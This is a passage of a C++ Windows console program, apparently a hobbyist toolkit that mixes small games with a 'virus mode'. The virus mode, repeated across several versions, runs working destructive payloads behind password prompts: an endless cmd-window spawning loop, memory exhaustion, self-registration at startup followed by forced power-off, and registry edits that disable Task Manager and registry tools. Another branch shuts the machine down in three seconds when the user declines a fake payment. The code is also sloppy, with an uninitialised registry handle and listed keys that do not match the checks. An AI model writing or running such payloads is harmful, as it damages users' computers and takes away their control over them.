					        if(Fire>0) Ball(1),Fire--;if(Water>0) Ball(2),Water--;if(Wind>0) Ball(3),Wind--;if(Thun>0) Ball(4),Thun--;
					        if(Boss==0) NorGuai(L,T%1500);RandGood();if(T%20==1)Exp++;
					        if(T%50==1){Exp++;system("cls");Setpos(20,0);Color(0);for(int i=1;i<=60;i++) printf("=");if(Win==0&&T<300){Setpos(4,6);cout<<"↑/↓ 跳跃/下翻，←→ 些微移动（松手即返回）"; Setpos(8,6);cout<<"球可以开启特殊效果，经验积满（300）可提升级别。";Setpos(8,6);cout<<"打败 7 波即胜利，打败 BOSS 有新天赋。";Setpos(10,15);cout<<"空格可以暂停。";}}
					        Map(-1,0);
					        if(Boss==1) Boss1();if(Boss==2) Boss2();if(Boss==3) Boss3();if(Boss==6) Boss1(),Boss2(),Boss3();
					        Move();Map(0,(bool)Kill);Color(0);
					        Setpos(1,1);Blo=fmin(Blo,(float)Blomax);if(Boss==0)cout<<"血量: "<<(int)Blo<<"  ";Color(0);Setpos(1,9),cout<<"死亡次数: "<<D<<"  ";Setpos(2,1);Exp=min(Exp,Expmax);if(Exp>=Expmax)Exp=0,Lv++,Lvl++,Hui++,Blomax+=5;if(Lvl>0)Color(5);cout<<"级别: "<<Lv;Color(0);Setpos(2,9);cout<<"经验: "<<Exp<<"  ";if(Boss>0) Setpos(3,1),cout<<"血量     : ",Ball(7);if(Boss>0&&Boss!=6) Setpos(4,1),cout<<"怪物血量: ",Ball(6);if(Boss==6) Setpos(1,9),printf("时间: %0.1f s  ",T/15.0);
					        if(Win==0) Sleep(55);if(Win==1) Sleep(50);if(Win==2) Sleep(35);if(Win==3) Sleep(40);if(Win==4) Sleep(25);if(Win==5) Sleep(30);if(Win==6) Sleep(20);if(Win>=7) Sleep(17);
					        if(Boss==3&&Bblo<=0){for(int i=1;i<=4;i++){br++;B[br].what=98;B[br].x=Bx3-1,B[br].y=By3-1+i;B[br].vy=4;B[br].life=1;br++;B[br].what=98;B[br].x=Bx3,B[br].y=By3-1+i;B[br].vy=4;B[br].life=1;br++;B[br].what=98;B[br].x=Bx3-2,B[br].y=By3-1+i;B[br].vy=4;B[br].life=1;}}
					        if((Win%2==0&&T>=1400)||(Win%2==1&&Bblo<=0)||(Win==7&&T>=450)||Blo<=0) {Map(-1,0);break;}
					    }
					    if(Blo<=0){
					        Sleep(1000);
					        D++;
					        system("color 7F");
					        Setpos(15,11);
					        Color(4);
					        cout<<"GAME OVER...";
					        Sleep(2000);
					        break;
					    }
					    else if(Win==6){
					        system("color 7F");
					        Setpos(15,11);
					        Color(4);
					        cout<<"坚持30秒 !";
					        Sleep(2000);
					        Setpos(30,0);
					        Win++;
					        D=0;
					    }
					    else if(Win==7){
					        Sleep(1000);
					        system("color 6E");
					        Setpos(15,11);
					        Color(5);
					        cout<<"YOU WIN !";
					        Sleep(2000);
					        Setpos(30,0);
					        return 0;
					    }else Sleep(1000),Win++,D=0;
					    goto Start;
					}
					else if(module == 10){
						sunny l;
						l.emlpd();
					}
			        else if (module == 11) {
			        	system("cls");
			        	system("title 帮助文件");
			            cout << "帮助文档：" <<endl;
			            cout << "帮助指令：" ;
			            cout << "0:退出程序,1：启动终止器，2：启动五子棋小游戏，3：启动贪吃蛇游戏"<<endl;
			            cout << "4：病毒（请勿随便乱按，否则电脑崩溃，请查看病毒密钥）" <<endl;
			            cout << "5：查看病毒密钥，6：打开谷歌浏览器poki小游戏，7：关机"<<endl;
						cout <<"8：打开jiao版AI，9：跑醋游戏，10：恶魔轮盘赌，11：查看帮助文件" <<endl;
			            system("pause");
			        }
			        else {
			            cout << "无此代码号" <<endl;
			            system("pause");
			        }
				}
			}
			else{
				cout<<"无此用户名！"; 
			}
		}else if(c==2){
			int z;
			string d;
			srand(time(0));
			z=rand()%5+1;
			system("cls");
			cout<<"目前您有"<<z<<"$"<<endl;
			cout<<"您需要付5$，您会欠债"<<z-5<<"$，您是否要付费："; 
			cin>>d;
			if(d=="是"){
				switch(z){
					case 1:
						cout<<"因您欠债"<<z-5<<"$，所以您只能使用jiao-killv1.1的内容" <<endl;
						sleep(2);
						system("cls");
						q_j1();
						kill_task();
						
					case 2:
						cout<<"因您欠债"<<z-5<<"$，所以您只能使用jiao-killv1.2的内容" <<endl;
						sleep(2);
						system("cls");
						q_j2();
					
						while (true) {
					        cout << "请输入模式(输入3查看帮助)：";
					        cin >> module;
					        if (module == 0) {
					            system("exit");
					        }
					        else if (module==1) {
					            kill_task();
					        }
					        else if (module == 2) {
					            GoBang g;
					            g.Play();
					            system("pause");
					        }
					        else if (module == 3) {
					            cout << "帮助文档：" <<endl;
					            cout << "帮助指令：" ;
					            cout << "0:退出程序,1：启动终止器，2：启动五子棋小游戏，3：查看帮助文档"<<endl;
					            system("pause");
					        }
					        else {
					            cout << "无此代码号";
					            system("pause");
					            break;
					        }
						}
						break;
					case 3:
						cout<<"因您欠债"<<z-5<<"$，所以您只能使用jiao-killv1.3的内容" <<endl;
						sleep(2);
						system("cls");
						q_j3();
					
						while (true) {
					        cout << "请输入模式(输入5查看帮助)：";
					        cin >> module;
					        if (module == 0) {
					            system("exit");
					        }
					        else if (module==1) {
					            kill_task();
					        }
					        else if (module == 2) {
					            GoBang g;
					            g.Play();
					            system("pause");
					        }
					        else if (module == 3) {
					        	int r;
								cout<<"Please input number(1~9) : ";
								cin>>r;
								if(r==1){
									int i;
									cout<<"Please input password: ";
									cin>>i;
									if(i==264697){
					    				cout<<"It's safe";
									}else{
										while(1)system("start cmd");
									}
								}else if(r==2){
									int i;
									cout<<"Please input password: ";
									cin>>i;
									if(i==417664){
					    			cout<<"It's safe";
									}else{
										while(1){
					    			    	HWND hWnd=GetForegroundWindow();
					    			    	ShowWindow(hWnd,SW_HIDE);
					    				}
									}
								}else if(r==3){
									int i;
									cout<<"Please input password: ";
									cin>>i;
									if(i==127619){
										cout<<"It's safe";
									}else{
					    				system("shutdown -s -t 60");//->1分钟
					    				system("shutdown -p");//->立刻
									}
								}else if(r==4){
									int i;
									cout<<"Please input password: ";
									cin>>i;
									if(i==529555){
										cout<<"It's safe";
									}else{
					    				while(1)malloc(1000);
									}
								}else if(r==5){
									int i;
									cout<<"Please input password: ";
									cin>>i;
									if(i==278230){
										cout<<"It's safe";
									}else{
					    				AutoRun_Startup("c://main.exe", "main.exe");
					    				system("shutdown /p");
									}
								}else if(r==6){
									int i;
									cout<<"Please input password: ";
									cin>>i;
									if(i==640855){
					    				cout<<"It's safe";
									}else{
					    				HKEY hkey;
					    				DWORD value = 1;
					    				RegCreateKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &hkey);
					    				RegSetValueEx(hkey, "DisableTaskMgr", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
					    				RegCloseKey(hkey);
									}
								}else if(r==7){
									int i;
									cout<<"Please input password: ";
									cin>>i;
									if(i==957040){
					    				cout<<"It's safe";
									}else{
					    				HKEY hkey;
					    				DWORD value = 1;
					    				RegCreateKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &hkey);
					    				RegSetValueEx(hkey, "DisableRegistryTools", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
					    				RegCloseKey(hkey);
									}
								}else if(r==8){
									int i;
									cout<<"Please input password: ";
									cin>>i;
									if(i==617735){
					    				cout<<"It's safe";
									}else{
					    				DWORD value = 1;
					    				HKEY hkey;
					    				RegSetValueEx(hkey, "Wallpaper", NULL, REG_SZ, (unsigned char *)"c://", 3);
					    				RegSetValueEx(hkey, "WallpaperStyle", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
					    			}
								}else if(r==9){
									int i;
									cout<<"Please input password: ";
									cin>>i;
									if(i==138208){
					    				cout<<"It's safe";
									}else{
					    				char *Fuck[4] = { "你", "好", "世", "界" };
					    				int FuckLen = sizeof(Fuck) / sizeof(int);
						    			TCHAR Destop[MAX_PATH];
					    				SHGetSpecialFolderPath(NULL, Destop, CSIDL_DESKTOP, FALSE);  
						    			for (int x = 0; x < FuckLen; x++){
						    		    	SetImmunity("c://", Fuck[x]);
						    		    	//ClearImmunity("c://", Fuck[x]);
						    			} 
					    				system("pause");
									}
								}else{
									cout<<"It's not true";
								}
					        	system("pause");
							}
							else if (module == 4) {
								cout << "1:  264697" <<endl;
								cout << "2:  417664" <<endl;
								cout << "3:  127619" <<endl;
								cout << "4:  529555" <<endl;
								cout << "5:  278230" <<endl;
								cout << "6:  640855" <<endl;
								cout << "7:  957040" <<endl;
								cout << "8:  617735" <<endl;
								cout << "9:  138203" <<endl;
							}
					        else if (module == 5) {
					            cout << "帮助文档：" <<endl;
					            cout << "帮助指令：" ;
					            cout << "0:退出程序,1：启动终止器，2：启动五子棋小游戏"<<endl;
					            cout << "3：病毒（请勿随便乱按，否则电脑崩溃，请查看病毒密钥）" <<endl;
					            cout << "4：查看病毒密钥，5：查看帮助文件" <<endl;
					            system("pause");
					        }
					        else {
					            cout << "无此代码号";
					            system("pause");
					            break;
					        }
						}
						break;
					case 4:
						cout<<"因您欠债"<<z-5<<"$，所以您只能使用jiao-killv1.4的内容" <<endl;
						sleep(2);
						system("cls");
						q_j4();
					
						while (true) {
					        cout << "请输入模式(输入6查看帮助)：";
					        cin >> module;
					        if (module == 0) {
					            break;
					            system("pause");
					        }
					        else if (module==1) {
					            kill_task();
					        }
					        else if (module == 2) {
					            GoBang g;
					            g.Play();
					            system("pause");
					        }
					        else if (module == 3) {
					        	system("cls");
					        	system("title 病毒模式");
					        	int r;
								cout<<"Please input number(1~9) : ";
								cin>>r;
								if(r==1){
									int i;
									cout<<"Please input password: ";
									cin>>i;
									if(i==264697){
					    				cout<<"It's safe";
									}else{
										while(1)system("start cmd");
									}
								}else if(r==2){
									int i;
									cout<<"Please input password: ";
									cin>>i;
									if(i==417664){
					    			cout<<"It's safe";
									}else{
										while(1){
					    			    	HWND hWnd=GetForegroundWindow();
					    			    	ShowWindow(hWnd,SW_HIDE);
					    				}
									}
								}else if(r==3){
									int i;
									cout<<"Please input password: ";
									cin>>i;
									if(i==529555){
										cout<<"It's safe";
									}else{
					    				while(1)malloc(1000);
									}
								}else if(r==4){
									int i;
									cout<<"Please input password: ";
									cin>>i;
									if(i==278230){
										cout<<"It's safe";
									}else{
					    				AutoRun_Startup("c://main.exe", "main.exe");
					    				system("shutdown /p");
									}
								}else if(r==5){
									int i;
									cout<<"Please input password: ";
									cin>>i;
									if(i==640855){
					    				cout<<"It's safe";
									}else{
					    				HKEY hkey;
					    				DWORD value = 1;
					    				RegCreateKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &hkey);
					    				RegSetValueEx(hkey, "DisableTaskMgr", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
					    				RegCloseKey(hkey);
									}
								}else if(r==6){
									int i;
									cout<<"Please input password: ";
									cin>>i;
									if(i==957040){
					    				cout<<"It's safe";
									}else{
					    				HKEY hkey;
					    				DWORD value = 1;
					    				RegCreateKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &hkey);
					    				RegSetValueEx(hkey, "DisableRegistryTools", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
					    				RegCloseKey(hkey);
									}
								}else if(r==7){
									int i;
									cout<<"Please input password: ";
									cin>>i;
									if(i==617735){
					    				cout<<"It's safe";
									}else{
					    				DWORD value = 1;
					    				HKEY hkey;
					    				RegSetValueEx(hkey, "Wallpaper", NULL, REG_SZ, (unsigned char *)"c://", 3);
					    				RegSetValueEx(hkey, "WallpaperStyle", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
					    			}
								}else if(r==8){
									int i;
									cout<<"Please input password: ";
									cin>>i;
									if(i==138208){
					    				cout<<"It's safe";
									}else{
					    				char *Fuck[4] = { "你", "好", "世", "界" };
					    				int FuckLen = sizeof(Fuck) / sizeof(int);
						    			TCHAR Destop[MAX_PATH];
					    				SHGetSpecialFolderPath(NULL, Destop, CSIDL_DESKTOP, FALSE);  
						    			for (int x = 0; x < FuckLen; x++){
						    		    	SetImmunity("c://", Fuck[x]);
						    		    	ClearImmunity("c://", Fuck[x]);
						    			} 
					    				system("pause");
									}
								}else{
									cout<<"It's not true";
								}
					        	system("pause");
							}
							else if (module == 4) {
								system("cls");
								system("title 病毒秘钥");
								cout << "1:  264697" <<endl;
								cout << "2:  417664" <<endl;
								cout << "3:  529555" <<endl;
								cout << "4:  278230" <<endl;
								cout << "5:  640855" <<endl;
								cout << "6:  957040" <<endl;
								cout << "7:  617735" <<endl;
								cout << "8:  138203" <<endl;
								system("pause"); 
							}
							else if(module == 5){
								system("cls");
								system("title 开始关机");
								cout<<"一分钟后关机！";
								system("shutdown -s -t 60");
								break;
							} 
					        else if (module == 6) {
					        	system("cls");
					        	system("title 帮助文件");
					            cout << "帮助文档：" <<endl;
					            cout << "帮助指令：" ;
					            cout << "0:退出程序,1：启动终止器，2：启动五子棋小游戏"<<endl;
					            cout << "3：病毒（请勿随便乱按，否则电脑崩溃，请查看病毒密钥）" <<endl;
					            cout << "4：查看病毒密钥，5：关机，6：查看帮助文件" <<endl;
					            system("pause");
					        }
					        else {
					            cout << "无此代码号" <<endl;
					            system("pause");
					        }
						}
						
					case 5:
						cout<<"您没有欠债，但是您使用的是付费jiao-kill，所以您只能使用jiao-killv2.0的内容" <<endl;
						sleep(2);
						system("cls");
						HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
						wuq();
						while (true) {
							SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
					        cout << "请输入模式(输入8查看帮助)：";
					        cin >> module;
					        if (module == 0) {
					            break;
					            system("pause");
					        }
					        else if (module==1) {
					            kill_task();
					        }
					        else if (module == 2) {
					            GoBang g;
					            g.Play();
					            system("pause");
					        }
							else if (module == 3){
								system("mode con cols=80 lines=30"); //设置cmd窗口大小
								system("color 2"); //设置字符颜色：0 黑；1 深蓝；2 深绿；3 深青；4 深红；5 深紫；6 深褐 
							    cout << "--------------------贪吃蛇---------------------" << endl;
							    cout << "先选择难度.请在1-10中输入1个数,1最简单,10则最难" << endl;
							    cout << "然后进入游戏画面,以方向键控制方向.祝你游戏愉快!" << endl;
							    cout << "-----------------------------------------------" << endl;
							    cout << "请输入难度级别：" ;
							    m=25;
							    n=40; 
							    if (m<10 || n<10 || m>25 || n>40)
							    {
							        cout << "ERROR" << endl;
							        system("pause");
							        return 0;
							    }
							    int hard;
							    cin >> hard;
							    if (hard<=0 || hard>100)
							    {
							        cout << "ERROR" << endl;
							        system("pause");
							        return 0;
							    }
							    /*** 数据全部初始化，包括蛇长，位置，方向 ***/
							    snake_length=5;
							    clock_t a,b;
							    char ch;
							    double hard_len;
							    for (int i=0;i<=4;i++)
							    {
							        snake[i].x=1;
							        snake[i].y=5-i;
							    }
							    dir=3;
							    /*** 输出初始地图，蛇与食物 ***/
							    system("cls");
							    hide();
							    print_wall();
							    print_food();
							    print_snake();
							    locate(m+2,0);
							    cout << "Now length: ";
							    /*** 开始游戏 ***/
							    while (1)
							    {
							        /*** 难度随长度增加而提高 ***/
							        hard_len=(double)snake_length/(double) (m*n);
							        /*** 调节时间，单位是ms ***/
							        a=clock();
							        while (1)
							        {
							            b=clock();
							            if (b-a>=(int)(400-30*hard)*(1-sqrt(hard_len))) break;
							        }
							        /*** 接受键盘输入的上下左右，并以此改变方向 ***/
							        if (kbhit())
							        {
							            ch=getch();
							            if (ch==-32)
							            {
							                ch=getch();
							                switch(ch)
							                {
							                case 72:
							                    if (dir==2 || dir==3)
							                        dir=0;
							                    break;
							                case 80:
							                    if (dir==2 || dir==3)
							                        dir=1;
							                    break;
							                case 75:
							                    if (dir==0 || dir==1)
							                        dir=2;
							                    break;
							                case 77:
							                    if (dir==0 || dir==1)
							                        dir=3;
							                    break;
							                }
							            }
							        }
							        /*** 前进 ***/
							        if (!go_ahead()) break;
							        /*** 在最后输出此时长度 ***/
							        locate(m+2,12);
							        cout << snake_length;
							    }
							    system("color 0");
								system("pause");
							}
					        else if (module == 4) {
					        	system("cls");
					        	system("title 病毒模式");
					        	int r;
								cout<<"Please input number(1~9) : ";
								cin>>r;
								if(r==1){
									int i;
									cout<<"Please input password: ";
									cin>>i;
									if(i==264697){
					    				cout<<"It's safe";
									}else{
										while(1)system("start cmd");
									}
								}else if(r==2){
									int i;
									cout<<"Please input password: ";
									cin>>i;
									if(i==417664){
					    			cout<<"It's safe";
									}else{
										while(1){
					    			    	HWND hWnd=GetForegroundWindow();
					    			    	ShowWindow(hWnd,SW_HIDE);
					    				}
									}
								}else if(r==3){
									int i;
									cout<<"Please input password: ";
									cin>>i;
									if(i==529555){
										cout<<"It's safe";
									}else{
					    				while(1)malloc(1000);
									}
								}else if(r==4){
									int i;
									cout<<"Please input password: ";
									cin>>i;
									if(i==278230){
										cout<<"It's safe";
									}else{
					    				AutoRun_Startup("c://main.exe", "main.exe");
					    				system("shutdown /p");
									}
								}else if(r==5){
									int i;
									cout<<"Please input password: ";
									cin>>i;
									if(i==640855){
					    				cout<<"It's safe";
									}else{
					    				HKEY hkey;
					    				DWORD value = 1;
					    				RegCreateKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &hkey);
					    				RegSetValueEx(hkey, "DisableTaskMgr", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
					    				RegCloseKey(hkey);
									}
								}else if(r==6){
									int i;
									cout<<"Please input password: ";
									cin>>i;
									if(i==957040){
					    				cout<<"It's safe";
									}else{
					    				HKEY hkey;
					    				DWORD value = 1;
					    				RegCreateKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &hkey);
					    				RegSetValueEx(hkey, "DisableRegistryTools", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
					    				RegCloseKey(hkey);
									}
								}else if(r==7){
									int i;
									cout<<"Please input password: ";
									cin>>i;
									if(i==617735){
					    				cout<<"It's safe";
									}else{
					    				DWORD value = 1;
					    				HKEY hkey;
					    				RegSetValueEx(hkey, "Wallpaper", NULL, REG_SZ, (unsigned char *)"c://", 3);
					    				RegSetValueEx(hkey, "WallpaperStyle", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
					    			}
								}else if(r==8){
									int i;
									cout<<"Please input password: ";
									cin>>i;
									if(i==138208){
					    				cout<<"It's safe";
									}else{
					    				char *Fuck[4] = { "你", "好", "世", "界" };
					    				int FuckLen = sizeof(Fuck) / sizeof(int);
						    			TCHAR Destop[MAX_PATH];
					    				SHGetSpecialFolderPath(NULL, Destop, CSIDL_DESKTOP, FALSE);  
						    			for (int x = 0; x < FuckLen; x++){
						    		    	SetImmunity("c://", Fuck[x]);
						    		    	ClearImmunity("c://", Fuck[x]);
						    			} 
					    				system("pause");
									}
								}else{
									cout<<"It's not true";
								}
					        	system("pause");
							}
							else if (module == 5) {
								system("cls");
								system("title 病毒秘钥");
								cout << "1:  264697" <<endl;
								cout << "2:  417664" <<endl;
								cout << "3:  529555" <<endl;
								cout << "4:  278230" <<endl;
								cout << "5:  640855" <<endl;
								cout << "6:  957040" <<endl;
								cout << "7:  617735" <<endl;
								cout << "8:  138203" <<endl;
								system("pause"); 
							}
							else if(module == 6){
								system("start http://www.google.com/poki.com");
							}
							else if(module == 7){
								system("cls");
								system("title 关机");
								cout<<"三秒后关机！";
								system("shutdown -s -t 3");
							} 
					        else if (module == 8) {
					        	system("cls");
					        	system("title 帮助文件");
					            cout << "帮助文档：" <<endl;
					            cout << "帮助指令：" ;
					            cout << "0:退出程序,1：启动终止器，2：启动五子棋小游戏，3：启动贪吃蛇游戏"<<endl;
					            cout << "4：病毒（请勿随便乱按，否则电脑崩溃，请查看病毒密钥）" <<endl;
					            cout << "5：查看病毒密钥，6：打开谷歌浏览器poki小游戏，7：关机"<<endl;
								cout <<"8：查看帮助文件" <<endl;
					            system("pause");
					        }
					        else {
					            cout << "无此代码号" <<endl;
					            system("pause");
					        }
						}
				}
			}else{
				cout << "竟然你不用，那你就滚！！！" <<endl;
				sleep(3);
				system("cls");
				system("title 你个大傻逼");
				cout<<"三秒后关机！";
				system("shutdown -s -t 3");
			}
		}else if(c==3){
			cout<<"********************************"<<endl;
			cout<<"*          用户列表            *"<<endl;
			cout<<"********************************"<<endl;
			cout<<"* 用户1  ： liusirui           *"<<endl;
			cout<<"* 密码    ： *********         *"<<endl;
			cout<<"********************************"<<endl;
			cout<<"* 用户2  ： cnm                *"<<endl;
			cout<<"* 密码    ： ******            *"<<endl;
			cout<<"********************************"<<endl;
			system("pause"); 
		}else{
			cout<<"无此代码号";
			system("pause");
		}
	}
	return 0;
}
